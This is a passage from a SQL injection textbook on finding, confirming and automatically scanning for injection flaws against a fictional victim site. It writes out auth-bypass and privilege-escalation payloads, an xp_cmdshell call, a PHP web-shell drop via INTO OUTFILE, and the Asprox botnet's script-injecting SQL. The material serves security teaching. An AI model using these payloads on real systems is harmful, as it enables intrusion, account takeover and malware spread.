would get with uid=45, \nthis means the database ignored the content of the comment. This might be due to a SQL injection vulnerability.  \nUsing Comments  \nLet’s see how we can use comments to terminate SQL statements.  \nWe are going to use the authentication mechanism in the Victim Inc. administration Web \nsite. Figure 2.15 represents the concept o f terminating the SQL statement.  \n \nFigure 2.15  Exploitation Terminating SQL Statement  \nIn this case, we are going to exploit the vulnerability terminating the SQL statement. We \nwill only inject code into the username  field and we will terminate  the statement. We will \ninject the code ‘ or 1=1; --, which will create the following statement:  \nSELECT ∗ \nFROM administrators  \nWHERE username = ’’ or 1=1;-- ‘ AND password = ’’;  \n\nThis statement will return all rows in the administrators  table due to the 1=1  condition. \nMoreover, it will ignore the part of the query after the comment, so we don’t have to wor ry \nabout the AND password=’’ . \nYou can also impersonate a known user by injecting admin’; --. This will create the \nfollowing statement:  \nSELECT ∗ \nFROM administrators  \nWHERE username = ‘admin’;-- ‘ AND password = ’’;  \nThis statement will return only one row cont aining the admin user successfully bypassing \nthe authentication mechanism.  \nYou may find scenarios where a double hyphen ( --) cannot be used because it is filtered by \nthe application or because commenting out the rest of the query generates errors. In such cases, \nyou can use multiline comments (/∗∗/) for commenting parts of the SQL statement. This technique requires more than one vulnerable parameter and an understanding of the position of the parameters in the SQL statement.  \nFigure 2.16 shows an example of a multiline comment attack. Note that the text in the \nPassword  field is disclosed for clarity. It illustrates an attack using multiline comments.  \n \nFigure 2.16  Using Multiline Comments  \n\nIn this attack, we use the Username  field to select the user we want and start the comment \nwith the /∗  sequence. In the Passwo rd field we finish the comment ( ∗/) and we add the single -\nquote sequence to end the statement syntactically correct with no effect on the result. The \nresultant SQL statement is: \nSELECT ∗ \nFROM administrators  \nWHERE username = ‘admin’/∗ ‘ AND password = ’ ∗/ ’’; \nRemoving the commented code helps to better illustrate the example: \nSELECT ∗ \nFROM administrators  \nWHERE username = ‘admin’’’;  \nAs you can see, we needed to finish the statement with a string due to the last single quote \ninserted by the application which we  cannot control. We chose to concatenate an empty string, \nwhich has no effect on the result of the query.  \nIn the previous example, we concatenated our input with an empty string. String \nconcatenation is something you will always need when doing SQL injection testing. However, because it is done differently in SQL Server, MySQL, Oracle, and PostgreSQL it can therefore be used as a tool to identify the remote database. Table 2.4 shows the concatenation operators \nin each d atabase.  \nTable 2.4  Database Concatenation Operators  \nDatabase  Concatenation  \nMicrosoft SQL Server  ‘a’ + ‘b’ = ‘ab’  \nMySQL  ‘a’ ‘b’ = ‘ab’  \nDatabase  Concatenation  \nOracle and PostgreSQL  ‘a’ || ‘b’ = ‘ab’  \nIf we find a parameter in a Web application which is vulnerable but we are unsure of the \nremote database server, we can use string concatenation techniques for identification. Remote \ndatabase identification can be done by replacing any vulnerable string pa rameter with a \nconcatenation in the following manner:  \nhttp://www.victim.com/displayuser.aspx?User=Bob -- Original request  \nhttp://www.victim.com/displayuser.aspx?User=B’+’ob -- MSSQL  \nhttp://www.victim.com/displayuser.aspx?User=B’’ob -- MySQL  \nhttp://www.victim.com/displayuser.aspx?User=B’||’ob -- Oracle or PostgreSQL  \nSending the three modified requests will tell you the database running on the remote back-\nend server, as two requests will return a syntax error and one of them will return the same \nresult as the original request indicating the underlying database.  \nTable 2.5 shows a summary with some signatures using database comments commonly used \nfor bypassing authentication mechanisms. \nTable 2.5  Signatures Using Database Com ments  \nTesting \nString  Variations  Expected Result s \nadmin’ -- admin’) -- Bypass authentication mechanism by returning the admin row set \nfrom the database  \nadmin’ # admin’)#  MySQL —Bypass authentication mechanism by returning the \nadmin row set from the database  \nTesting \nString  Variations  Expected Result s \n1-- 1)-- Commenting out the rest of the query, it is expected to remove any \nfilter specified in the WHERE clause after the injectable \nparameter  \n1 or 1=1--  1) or 1=1--  Return all rows injecting a numeric parameter  \n‘ or ‘1’=’1’-- ‘) or \n‘1’=’1’--  Return all rows injecting a string parameter  \n-1 and 1=2--  -1) and 1=2-\n- Return no rows injecting a numeric parameter  \n‘ and ‘1’=’2’ -\n- ‘) and \n‘1’=’2’--  Return no rows injecting a string parameter  \n1/∗comment∗/  Comment injection. If successful, it makes no difference to the \noriginal request. Helps identify SQL injection vulnerabilities  \nExecuting Multiple Statements  \nTerminating a SQL  statement provides you with greater control over the SQL code sent to the \ndatabase server. In fact, this control goes beyond the statement created by the database. If you \nterminate the SQL statement you can create a brand -new one with no restrictions on i t. \nMicrosoft SQL Server 6.0 introduced server -side cursors to its architecture, which provided \nthe functionality of executing a string with multiple statements over the same connection handle. This functionality is also supported in all the later versions and allows the execution of \nstatements such as the following:  \nSELECT foo FROM bar; SELECT foo2 FROM bar2;  \nThe client connects to the SQL Server and sequentially executes each statement. The \ndatabase server returns to the client as many result sets as statemen ts were sent.  \nThis is also supported in PostgreSQL databases. MySQL has also introduced this \nfunctionality in Version 4.1 and later; however, this is not enabled by default. Oracle databases \ndon’t support multiple statements in this way, unless using PL/SQ L. \nThe exploitation technique requires that you are able to terminate the first statement, so you \ncan then concatenate arbitrary SQL code.  \nThis concept can be exploited in a number of ways. Our first example will target an \napplication connecting to a SQL S erver database. We are going to use multiple statements to \nescalate privileges within the application —for example, by adding our user to the \nadministrators group. Our goal will be to run an UPDATE statement for that: \nUPDATE users/∗  Update table Users ∗/ \nSET isadmin=1/ ∗ Add administrator privileges in the application ∗ / \nWHERE uid=<Your User ID> /∗  to your user ∗ / \nWe need to start the attack, enumerating columns using the HAVING 1=1  and GROUP BY  \ntechnique explained before:  \nhttp://www.victim.com/welcome.aspx?user=45; select ∗  from usershaving 1=1;--  \nThis will return an error with the first column name and will need to repeat the process, \nadding the names to the GROUP BY  clause:  \nhttp://www.victim.com/welcome.aspx?user=45;select ∗ from users having 1=1GROUP BY uid; -- \nhttp://www.victim.com/welcome.aspx?user=45;select ∗ from users having 1=1GROUP BY uid, \nuser;--  \nhttp://www.victim.com/welcome.aspx?user=45;select ∗ from users having 1=1GROUP BY uid, user, \npassword;--  \nhttp://www.victim.com/welcome.aspx?user=45;select ∗ from users having 1=1GROUP BY uid, user, \npassword, isadmin; -- \nOnce we discover the column names, the next URL with the injected code to add \nadministrative privileges to the Victim Inc. Web application would be: \nhttp://www.victim.com/welcome.aspx?uid=45;UPDATE users SET isadmin=1 WHERE uid=45; -- \nWarning  \nBe very careful when escalating privileges by executing an UPDATE  statement, and always add a WHERE  clause \nat the end. Don’t do something like this:  \nhttp://www.victim.com/welcome.aspx?uid=45; UPDATE users SET isadmin=1  \nas that would update every record in the users  table, which is not what we want to do.  \nHaving the possibility of executing arbitrary SQL code offers many vectors of attack. You \nmay opt to add a new user:  \nINSERT INTO administrators (username, password)  \nVALUES (‘hacker’, ‘mysecretpassword’)  \nThe idea is that depending on the application, you can execute the appropriate statement. \nHowever, you will not get the results for the query if you execute a SELECT , as the Web \nserver will read only the first record set. In Chapter 5  you will learn techniques for appending \ndata to the existing results using UNION  statements. Additionally, you have the ability (given \nthe database user has enough permissions) to interact with the operating system, such as to \nread and write files, and execute operating system commands. These types of attack are explained in detail in Chapter 6 , and are good examples of typical uses of multiple statements:  \nhttp://www.victim.com/welcome.aspx?uid=45;exec master..xp_cmdshell ‘ping www.google.com’;--  \nWe are now going to explore similar techniques using multiple SQL statements in MySQL \ndatabases (if multiple statements functionality is enabled). The technique and functionality are exactly the same and we will have to terminate the first query and execute arbitrary code in the second. For this example, our  code of choice for the second statement is:  \nSELECT ‘<?php echo shell_exec($_GET[“cmd”]);?>’  \nINTO OUTFILE ‘/var/www/victim.com/shell.php’;--  \nThis SQL statement outputs the string ‘<?php echo shell_exec($_GET[“cmd”]);?>’  into \nthe /var/www/victim.com/shell.p hp file. The string written to the file is a PHP script that \nretrieves the value of a GET  parameter called cmd  and executes it in an operating system shell. \nThe URL conducting this attack would look like this:  \nhttp://www.victim.com/search.php?s=test’;SELECT ‘<?php echo shell_exec($_GET[“cmd”]);?>’ \nINTO OUTFILE ‘/var/www/victim.com/shell.php’;--  \nProvided MySQL is running on the same server as the Web server and the user running \nMySQL has enough permissions, and the server has multiple statements enabled, the  preceding \ncommand should have created a file in the Web root which allows arbitrary command \nexecution:  \nhttp://www.victim.com/shell.php?cmd=ls  \nYou will learn more about exploiting this kind of issue in Chapter 6 . For n ow, the important \nthing is that you learn the concept and the possibilities of running arbitrary SQL code in multiple statements.  \nTable 2.6 shows signatures used for injecting multiple statements . \nNotes from the Underg round…  \nUse of SQL Injection by the Asprox Botnet  \nA botnet is a large network of infected computers normally used by criminals and organized crime entities to \nlaunch phishing attacks, send spam e -mails, or launch distributed denial of service (DoS) attacks.  \nNewly infected computers become part of the botnet which is controlled by a master server. There are several \nmodes of infection, one of the most common being the exploitation of Web browser vulnerabilities. In this \nscenario, the victim opens a Web page served by a malicious Web site which contains an exploit for the victim’s \nbrowser. If the exploit code is executed successfully the victim is infected.  \nAs a consequence of this method of infection, it is not a surprise that botnet owners are always looking f or \ntarget Web sites to serve their malicious software.  \nThe Asprox Trojan was primarily designed to create a spam botnet dedicated to sending phishing e -mails. \nHowever, during May 2008 all the infected systems in the botnet received an updated component in a file called \nmsscntr32.exe. This file is a SQL injection attack tool which is installed as a system service under the name of \n“Microsoft Security Center Extension.”  \nOnce the service is running, it uses the Google search engine to identify potential victim s by identifying hosts \nrunning .asp pages with GET  parameters. The infecting code terminates the current statements and appends a new \none as you just saw in this chapter. Let’s have a look at the infecting URL:  \nhttp://www.victim.com/vulnerable.asp?id=425;DECLARE @S  \nVARCHAR(4000);SET @S=CAST(0x4445434C4152452040542056415243  \n<snip>  \n434C415245202075F437572736F72 AS  \nVARCHAR(4000));EXEC(@S);--  [shortened for brevity]  \nThe following is the unencoded and commented code that performs the attack:  \nDECLARE  \n@T VARCHAR(255),/ ∗ variable to store the table name ∗/ \n@C VARCHAR(255)/ ∗ variable to store the column name ∗/ \nDECLARE Table_Cursor CURSOR  \n/∗ declares a DB cursor that will contain ∗/ \nFOR /∗ all the table/column pairs for all the ∗/ \nSELECT a.name,b.name/ ∗ user created tables and ∗/ \nFROM sysobjectsa,syscolumns b  \n/∗ columns typed text(35), ntext (99), varchar(167) ∗/ \n/∗ orsysname(231) ∗/ \nWHERE a.id=b.id AND a.xtype=‘u’ AND (b.xtype=99 OR b.xtype=35 OR b.xtype=231  \nOR b.xtype=167)  \nOPEN Table_Cursor / ∗ Opens the cursor ∗/ \nFETCH NEXT FROM Table_Cursor INTO @T, @C  \n/∗ Fetches the first result ∗/ \nWHILE(@@FETCH_STATUS=0) / ∗ Enters in a loop for every row ∗ /BEGIN EXEC(‘ UPDATE [’ +@T+’] SET  \n/∗ Updates every column and appends ∗/ \n[‘+@C+’]=RTR IM(CONVERT(VARCHAR(8000),[’+@C+’]))+  \n/∗ a string pointing to a malicious ∗/ \n“<scriptsrc=http://www.banner82.com/b.js></script>’’’)  \n/∗ javascript file ∗/ \nFETCH NEXT FROM Table_Cursor INTO @T,@C  \n/∗ Fetches next result ∗/ \nEND \nCLOSE Table_Cursor / ∗ Closes the cursor ∗/ \nDEALLOCATE Table_Cursor/ ∗ Deallocates the cursor ∗/ \nThe code updates the content of the database appending a <script>  tag. If any of the contents are shown in a \nWeb page (which is very likely), the visitor will lo ad the contents of the JavaScript file into the browser.  \nThe purpose of the attack is to compromise Web servers and modify the legitimate HTML code to include a \nJavaScript file which contained the necessary code to infect more vulnerable computers and cont inue to grow the \nbotnet.  \nIf you want more information about Asprox, visit the following URLs:  \n• www.toorcon.org/tcx/18_Brown.pdf  \n• xanalysis.blogspot.com/2008/05/asprox -trojan -and-banner82com.html  \nTable 2.6  Signatures for Executing Multiple Statements  \nTesting String  Variations  Expected Result s \n’;[SQL \nStatement]; -- ’);[SQL \nStatement]; -- Execution of multiple statements injecting a string \nparameter  \n’;[SQL \nStatement];# ’);[SQL \nStatement];# MySQL —Execution of multiple statements injecting a \nstring parameter (if enabled on database)  \n;[SQL \nStatement]; -- );[SQL \nStatement]; -- Execution of multiple statements injecting a numeric \nparameter  \n;[SQL \nStatement];# );[SQL \nStatement];# MySQL —Execution of multiple statements injecting a \nnumeric parameter (if enabled on database)  \nTime Delays  \nWhen testing applications for SQL injection vulnerabilities you will often find yourself with a \npotential vulnerability that is d ifficult to confirm. This can be due to a  number of reasons, but \nmainly because the Web application is not showing any errors and because you cannot retrieve any data.  \nIn this kind of situation, it is useful to inject database time delays and check whether  the \nresponse from the server has also been delayed. Time delays are a very powerful technique as the Web server can hide errors or data, but cannot avoid waiting for the database to return a result, and therefore you can confirm the existence of SQL injec tion. This technique is \nespecially useful in blind injection scenarios.  \nMicrosoft SQL servers have a built -in command to introduce delays to queries: WAITFOR \nDELAY ‘hours:minutes:seconds’ . For example, the following request to the Victim Inc. Web \nserver takes around 5  s: \nhttp://www.victim.com/basket.aspx?uid=45;waitfor delay ‘0:0:5’;--  \nThe delay in the response from the server assures us that we are injecting SQL code into the \nback -end dat abase.  \nMySQL databases don’t have an equivalent to the WAITFOR DELAY  command. However, \nit is possible to introduce a delay using functions which take a long time to operate. The \nBENCHMARK  function is a good option. The MySQL BENCHMARK  function executes an \nexpression a number of times. It is used to evaluate the speed of MySQL executing expressions. The amount of time required by the database varies depending on the workload of the server and the computing resources; however, provided the delay is noticeable , this \ntechnique can be used for identification of vulnerabilities. Let’s have a look at the following example:  \nmysql> SELECT BENCHMARK(10000000,ENCODE(‘hello’,‘mom’));  \n+---------------------------------------------- + \n| BENCHMARK(10000000,ENCODE(‘hello’,‘m om’)) |  \n+---------------------------------------------- + \n| 0 |  \n+---------------------------------------------- + \n1 row in set (3.65 sec)  \nIt took 3.65 s to execute the query, and therefore if we inject this code into a SQL injection \nvulnerability it will del ay the response from the server. If we want to delay the response \nfurther, we just need to increment the number of iterations. Here is an example:  \nhttp://www.victim.com/display.php?id=32; SELECT BENCHMARK(10000000,ENCODE(‘hello’,‘mom’)); -- \nIn Oracle PL/SQL , it is possible to create a delay using the following set of instructions:  \nBEGIN  \nDBMS_LOCK.SLEEP(5);  \nEND; \nThe DBMS_LOCK.SLEEP()  function puts a procedure to sleep for a number of seconds; \nhowever, a number of restrictions apply to this function. The first  one is that this function \ncannot be injected directly into a subquery, as Oracle doesn’t support stacked queries. Second, \nthe DBMS_LOCK package is available only for database administrators.  \nA better approach in Oracle PL/SQL, which allows inline injectio n uses the following set of \ninstructions:  \nhttp://www.victim.com/display.php?id=32 or 1=dbms_pipe.receive_message(‘RDS’, 10)  \nThe function DBMS_PIPE.RECEIVE_MESSAGE is waiting 10 s for data from the pipe \nRDS. The package is granted to public by default. In opposite to procedures like DBMS_LOCK.SLEEP() a function can be used in a SQL statement.  \nOn recent PostgreSQL databases (8.2 and up), the pg_sleep function can be used to induce \ndelays:  \nhttp://www.victim.com/display.php?id=32; SELECT pg_sleep(10);--  \nThe “Us ing Time -Based Techniques” section in Chapter 5  discusses exploitation techniques \nwhere time is involved.  \nAutomating SQL Injection Discovery  \nSo far in this chapter, you have seen techniques for manually finding SQL inj ection \nvulnerabilities in Web applications. You saw that the process involves three tasks:  \n• Identifying data entry  \n• Injecting data  \n• Detecting anomalies from the response  \nIn this section, you will see that you can automate the process to a certain extent, but there \nare some issues that an application needs to deal with. Identifying data entry is something that can be automated. It is just a matter of crawling the Web site a nd finding GET  and POST  \nrequests. Data injection can also be done in an automatic fashion, as all the necessary data for sending the requests has been obtained in the previous phase. The main problem with automatically finding SQL injection vulnerabilities comes with detecting an omalies from the \nresponse of the remote server.  \nAlthough it is very easy for a human to distinguish an error page or another kind of \nanomaly, it is sometimes very difficult for a program to understand the output from the server.  \nIn some occasions, an appli cation can easily detect that a database error has occurred:  \n• When the Web application returns the SQL error generated by the database \n• When the Web application returns an HTTP 500 error  \n• Some cases of blind SQL injection  \nHowever, in other scenarios an application will find it hard to identify an existing \nvulnerability and will possibly miss it. For that reason, it is important to understand the \nlimitations of automating SQL injection discovery and the importance of manual testing.  \nMoreover, there is yet  another variable when testing for SQL injection vulnerabilities. \nApplications are coded by humans, and at the end of the day bugs are coded by humans. When you look at a Web application you can perceive where the potential vulnerabilities might be, guided  by your instinct and your experience. This happens because you can understand the \napplication which is something that an automated tool is not able to do.  \nA human can easily spot a part of a Web application which is not fully implemented, maybe \njust readi ng a “Beta release—we are still testing”  banner in the page. It seems apparent that \nyou may have better chances of finding interesting vulnerabilities there than testing mature code.  \nAdditionally, your experience tells you what part of the code might have been overlooked \nby the programmers. For example, there are scenarios where most of the input fields may be validated if they require direct entry from the user. However, those which are a result of another process, dynamically written to the page (where th e user can manipulate them) and \nthen reused in the SQL statements, tend to be less validated as they are supposed to come from a trusted source.  \nOn the other hand, automated tools are systematic and thorough. They don’t understand the \nWeb application logic , but they can test very quickly a lot of potential injection points which is \nsomething that a human cannot do thoroughly and consistently.  \nTools for Automatically Finding SQL Injection  \nIn this section, I will show you some commercial and free tools design ed to find SQL injection \nvulnerabilities. Tools exclusively focused on exploitation will not be presented in this chapter.  \nHP WebInspect  \nWebInspect is a commercial tool by Hewlett- Packard. Although you can use it as a SQL \ninjection discovery tool, the real  purpose of this tool is to conduct a full assessment of the \nsecurity of a Web site. This tool requires no technical knowledge and runs a full scan, testing \nfor misconfigurations and vulnerabilities at the application server and Web application layers. Figure 2.17 shows the tool in action. \n \nFigure 2.17  HP WebInspect  \nWebInsp ect systematically analyzes the parameters sent to the application, testing for all \nkinds of vulnerabilities including cross -site scripting (XSS), remote and local file inclusion, \nSQL injection, operating system command injection, and so on. With WebInspec t you can also \nsimulate a user authentication or any other process by programming a macro for the test. This tool provides four authentication mechanisms: Basic, NTLM, Digest, and Kerberos. WebInspect can parse JavaScript and Flash content and it is capabl e of testing Web 2.0 \ntechnologies. \n\nIn regard to SQL injection, it detects the value of the parameter and modifies its behavior \ndepending on whether it is string or numeric. Table 2.7 shows the injection strings sent by  \nWebInspect for identification of SQL injection vulnerabilities.  \nTable 2.7  Signatures Used by WebInspect for SQL Injection Identification  \nTesting String s \n’ \nvalue’ OR  \nvalue’ OR 5=5 OR ‘s’=’0  \nvalue’ AND 5=5 OR ‘s’=’0  \nvalue’ OR 5=0 OR ‘s’=’0  \nvalue’ AND 5=0 OR ‘s’=’0  \n0+value  \nvalue AND 5=5  \nvalue AND 5=0  \nvalue OR 5=5 OR 4=0  \nvalue OR 5=0 OR 4=0  \nWebInspect comes with a tool called SQL Injector which you can use to exploit the SQL \ninjection vulnerabilities discovered during the scan. SQL Injector has the  option of retrieving \ndata from the remote database and showing it to the user in a graphical fo rmat.  \n• URL: www8.hp.com/us/en/software/software -solution.html?compURI=tcm:245- 936139 \n• Supported platforms: Microsoft Windows XP Professional SP3, WindowsServer2003 SP2, \nWindows Vista SP2, Windows 7 and Windows Server 2008 R2  \n• Requirements: Microsoft .NE T 3.5 SP1, Microsoft SQL Server or Microsoft SQL Server \nExpress Edition  \n• Price: Contact vendor for a quote  \nIBM Rational AppScan  \nAppScan is another commercial tool used for assessing the security of a Web site, which \nincludes SQL injection assessment funct ionality. The application runs in a similar manner to \nWebInspect, crawling the targeted Web site and testing for a large range of potential vulnerabilities. The application detects regular SQL injection and blind SQL injection vulnerabilities, but it doesn ’t include a tool for exploitation as does WebInspect. Table 2.8 \nshows the injection strings sent by AppScan during the inference process.  \nTable 2.8  Signatures Used by AppScan for SQL Injection Identification  \n \nAppScan also provides macro recording functionality to simulate user behavior and enter \nauthentication credentials. The platform supports basic HTTP and NTLM authentication as \nwell as client -side certificates.  \nAppScan offers a very interesting functionality called a privilege escalation test. Essentially, \nyou can conduct a test to the same target using different privilege levels —for example, \nunauthenticated, read -only, and administrator. After that, AppScan will try to access from a \nlow-privileged account information available only for higher -privileged accounts, flagging any \npotential privilege escalation issue.  \nFigure 2.18 shows a screenshot of AppScan during the scanning process.  \n• URL: www.ibm.com/software/awdtools/appscan/  \n• Supported platforms: Microsoft Windows XP Professional SP2, Windows  Server 2003, \nWindows Vista, Windows 7, and Windows Server 2008 and 2008 R2 \n• Requirements: Microsoft .NET 2.0 or 3.0 (for some optional additional functionality)  \n• Price: Contact vendor for a quote  \n\n \nFigure 2.18  IBM Rational AppScan  \nHP Scrawlr  \nScrawlr is a free tool developed by the HP Web Security Research Group. Scrawlr crawls the \nURL specified and analyzes the parameters of each Web page for SQL injection vulnerabilities.  \nHTTP crawling is the action of retrieving a Web page and identifying the Web links \ncontained on it. This action is repeated for each i dentified link until all the  linked content of the \nWeb site has been retrieved. This is how Web assessment tools create a map of the target Web site and how search engines index contents. During the crawling process Web assessment tools also store parameter information for later testing.  \nAfter you enter the URL and click Start , the application crawls the target Web site and \nperforms the inference process for discovering SQL injection vulnerabilities. When finished it shows the results to the user, as shown in Figure 2.19. \n\n \nFigure 2.19  HP Scrawlr  \nThis tool requires no te chnical knowledge; the only information you need to enter is the \ndomain name you want to test. You cannot test a specific page or folder as the tool starts \ncrawling the Web site from the root folder, so if the page that you want to test is not linked to any other page the crawling engine will not find it and it will not be tested.  \nScrawlr only tests GET  parameters, and therefore all the forms in the Web site will remain \nuntested, which renders the result incomplete. Here is a list of Scrawlr limitations: \n• Maximum of 1,500 crawled URLs  \n• No script parsing during crawl  \n• No Flash parsing during crawl  \n• No form submissions during crawl (no POST  parameters)  \n• Only simple proxy support  \n• No authentication or login functionality  \n\n• Does not check for blind SQL inj ection  \nDuring the inference process Scrawlr sends only three injection strings, shown in Table 2.9.  \nTable 2.9  Signatures Used by Scrawlr for SQL Injection Identification  \nTesting String s \nvalue’ OR  \nvalue’ AND 5=5 OR ‘s’=’0  \nnumber -0 \nScrawlr only detects verbose SQL injection errors where the server returns an HTTP 500 \ncode page with the returned error message from the database.  \n• URL: https://h30406.www3.hp.com/campaigns/2008/wwcampaign/1- 57C4K/index.php  \n• Supported platform: Microsoft Windows  \n• Price: Free  \nSQLiX  \nSQLiX is a free Perl application coded by Cedric Cochin. It is a scanner that is able to crawl \nWeb sites and detect SQL injection and blind SQL injection vulnerabilities. Figure 2.20 shows \nan example.  \n \nFigure 2.20  SQLiX  \nIn Figure 2.20, SQLiX is crawling and testing Victim Inc.’s Web site: perl SQLiX.pl -\ncrawl=“ http://www.victim.com/” -all -exploit  \nAs you can see from the screenshot, SQLiX crawled Victim Inc.’s Web site and \nautomatically discovered several SQL injection vulnerabilitie s. However, the tool missed a \nvulnerable authentication form even when it was linked from the home page. SQLiX does not \nparse HTML forms and automatically sends POST  requests.  \nSQLiX provides the possibility of testing only one page (with the –url  modifier)  or a list of \nURLs contained in a file (the –file  modifier). Other interesting options include –referer , –\nagent , and –cookie to include the Referer, User -Agent, and Cookie headers as a potential \ninjection vector.  \nTable 2.10 shows the injection strings SQLiX uses during the inference process.  \n• URL: www.owasp.org/index.php/Category:OWASP_SQLiX_Project  \n• Supported platform: Platform -independent, c oded with Perl  \n• Requirement: Perl  \n• Price: Free  \nTable 2.10  Signatures Used by SQLiX for SQL Injection Identification  \n\n \nParos Proxy/Zed Attack Proxy  \nParos Proxy is a Web assessment tool primarily used for manually manipulating Web traffic. It \nacts as a proxy and traps the requests made from the Web browser , allowing manipulation of \nthe data sent to the server. The free version of Paros Proxy is no longer maintained, however a fork of the original called Zed Attack Proxy (ZAP) is available.  \nParos and ZAP also have a built -in Web crawler, called a spider. You  just have to right -click \none of the domains displayed on the Sites tab and click Spider . You can also specify a folder \nwhere the crawling process will be executed. When you click Start  the tool will begin the \ncrawling process.  \nNow you should have all the discovered files under the domain name on the Sites tab. You \njust need to select the domain you want to test and click Analyse  | Scan . Figure 2.21 shows the \nexecution of a scan against Victim Inc.’s Web site.  \n\n \nFigure 2.21  Paros Proxy  \nThe identified security issues are displayed in the lower pane under the Alerts tab. Paros \nProxy and ZAP test GET  and POST  requests. Moreover, it supports blind SQL injection \ndiscovery, which makes it a good candidate among the free software alternatives.  \nTable 2.11 shows a list of the testing strings the tool uses.  \n• URL: Paros —www.parosproxy.org/  \n• URL: ZAP —www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project  \n• Supported platform: Platform -independent, coded with Java  \n• Requirement: Java Runtime Environment (JRE) 1.4 (or later)  \n• Price: Free  \nTable 2.11  Signatures Used by Paros Proxy for SQL Injection Identification \n\n \nSummary  \nThe first step for successful SQL i njection exploitation is to find the vulnerable piece of code \nwhich will allow you to perform the injection. In this chapter, I covered the process of finding \nSQL injection vulnerabilities from a black -box perspective, explaining the steps that you need \nto take.  \nWeb applications are an example of client/server architecture where the browser is the client \nand the Web application is the server. You learned how you can manipulate the data sent from the browser to the server in order to trigger SQL errors and i dentify vulnerabilities. Depending \non the Web application and the amount of information leaked, the process of identifying a vulnerability varies in complexity. In some scenarios, the application responds to the Web request with the error returned from the  database. However, there are scenarios where you will \nneed to pay attention to details to identify the vulnerability.  \nOnce you identify a vulnerability and you have evidence that you can inject SQL code using \nthe Web application input, you need to craft a  SQL snippet that will become a syntactically \ncorrect statement. There are several techniques for doing this, including injecting the code inline where all of the code of the original statement is executed, and commenting parts of the query to avoid execut ion of the full statement. The success of this phase will prepare you for \nfurther exploitation. \nA number of commercial and free tools automate the process of finding SQL injection \nvulnerabilities. Although they are all able to detect simple vulnerabilities  where the application \nreturns a standard SQL error, they provide varying degrees of accuracy when it comes to other \n\nscenarios such as custom errors. Additionally, the free tools generally focus on testing only \nGET  requests, leaving the remaining POST  requ ests untested. \nSolutions Fast Track  \nFinding SQL Injection \n• There are three key aspects for finding SQL injection vulnerabilities: (1) identifying the data \nentry accepted by the application, (2) modifying the value of the entry including hazardous strings,  and (3) detecting the anomalies returned by the server.  \n• Manipulation tools acting as a Web proxy help to bypass client -side restrictions, providing \nfull control of the requests sent to servers. Additionally, they offer greater visibility of the response  from the server, providing greater chances of detecting subtle vulnerabilities that \ncould remain undetected if visualized in the Web browser.  \n• A response of the server which includes a database error or that is an HTTP error code \nusually eases the identi fication of the existence of a SQL injection vulnerability. However, \nblind SQL injection is something that can also be exploited, even if the application doesn’t return an obvious error.  \nConfirming SQL Injection  \n• To confirm a SQL injection vulnerability a nd in prevision for later exploitation you need to \ncraft a request that injects SQL code such that the application creates a syntactically correct SQL statement that is in turn executed by the database server without returning any errors.  \n• When creating a syntactically correct statement you may be able to terminate it and comment \nout the rest of the query. In these scenarios, and provided that the back -end database supports \nmultiple statements, you usually can chain arbitrary SQL code with no restrictions,  providing \nyou with the ability to conduct attacks such as privilege escalation.  \n• Sometimes the application will not reply with any visual sign of the injection attempts. In \nsuch cases, you can confirm the injection by introducing a delay in the reply from the database. The application server will wait for the database to reply and you will be able to verify whether a vulnerability exists. In this scenario, you need to be aware that network and server workloads might interfere slightly with your delays.  \nAutomating SQL Injection Discovery  \n• The processes involved in finding SQL injection vulnerabilities can be automated to a certain \nextent. Automation can be very beneficial when you need to test large Web sites; however, \nyou need to be aware that automatic discovery tools may not identify some of the existing vulnerabilities. Don’t rely fully on automated tools. \n• Several commercial tools provide a full security assessment of a Web site, including testing \nfor SQL injection vulnerabilities.  \n• The free and open source tools offer a good alternat ive to aid you in the process of finding \nSQL injection vulnerabilities in large sites.  \nFrequently Asked Questions  \nQ: Can every single Web application be vulnerable to SQL injection?  \nA: No, SQL injection vulnerabilities can be present only in applications which access a SQL \ndatabase. If an application doesn’t connect to any database, it will not be vulnerable to SQL injection vulnerabilities. If the application connects to a database, thi s doesn’t necessarily \nmean that it is vulnerable. It is your job to find out. \nQ: I observe a weird behavior in a Web application when I insert a single quote in the search \nfunctionality. However, I don’t get any errors. Can the application be exploited?  \nA: Well, it depends. If it turns out to be a SQL injection vulnerability then yes, you can exploit \nan application even if it doesn’t return database errors. The inference process to craft a valid \nSQL statement is a bit harder, but it is just a matter of following an educated trial -and-error \nprocess.  \nQ: What is the difference between SQL injection and blind SQL injection?  \nA: Regular SQL injection happens when the application returns data from the database and \npresents it to you. In a blind SQL injection vulner ability, you get only two different responses \nwhich correspond to a true and false condition in the injection. \nQ: Why do I need to automate blind SQL injection exploitation and I don’t have to automate \nregular SQL injection?  \nA: Exploitation of blind SQL in jection vulnerabilities requires around five or six requests to \nthe remote Web server to find out each character. To display the full version of the database \nserver you may require several hundred requests, rendering a manual approach arduous and \nunfeasibl e. \nQ: What is the main reason for the presence of SQL injection vulnerabilities?  \nA: The main process failure is generated when the Web application performs insufficient \nsanitization and/or output encoding of user -provided data. Additionally, the attacker c an take \nadvantage of other issues, such as poor design or bad coding practices. However, all of these can be exploited as a consequence of the lack of input sanitization.  \nQ: I have detected and confirmed a blind SQL injection vulnerability, but the typical  \nexploitation tools don’t seem to work.  \nA: Blind SQL injection is slightly different every time, and sometimes the existing tools can’t \nexploit every scenario. Verify that the vulnerability can be demonstrated manually and that your tool has been configure d correctly. If it still doesn’t work, my recommendation is that you \nread the source code of one of your tools and customize it to meet your needs. \n \n \n \n  \n \n  \n \n \nChapter 3  \nReviewing Code for SQL Injection  \nDave Hartley  \nSolutions in this chapter:  \n• Reviewing Source Code f or SQL Injection \n• Automated Source Code Review  \nIntroduction  \nOften, the quickest way to find potential areas for SQL injection in an application is to review \nan application’s source code. Also, if you are a developer who is not allowed to use SQL injection  testing tools as part of your development process (not an uncommon situation in \nbanks, and usually something for which you can be fired) it may be your only option. \nSome forms of dynamic string building and execution are also clear from a quick review of \ncode. What is often not clear is whether the data used in these queries are sourced from the user’s browser, or whether they have been correctly validated or encoded prior to being submitted back to the user. These are just some of the challenges facing th e code reviewer \nwhen hunting for SQL injection bugs.  \nThis chapter covers tips and tricks for finding SQL injection in code, from identifying where \nthe user -controllable input can enter the application, to identifying the types of code constructs \nthat can l ead to an SQL injection exposure. In addition to manual techniques, we will also look \nat automating source code reviews using some of the tools available, and examples of using these tools to speed up the review process. \nReviewing source code for SQL injection  \nThere are two main methods of analyzing the source code for vulnerabilities: static code analysis and dynamic code analysis. Static code analysis is the process of analyzing the source code without actually executing  the code. Dynamic code analysis is the analysis of code \nperformed at runtime. Manual static code analysis involves reviewing the source code 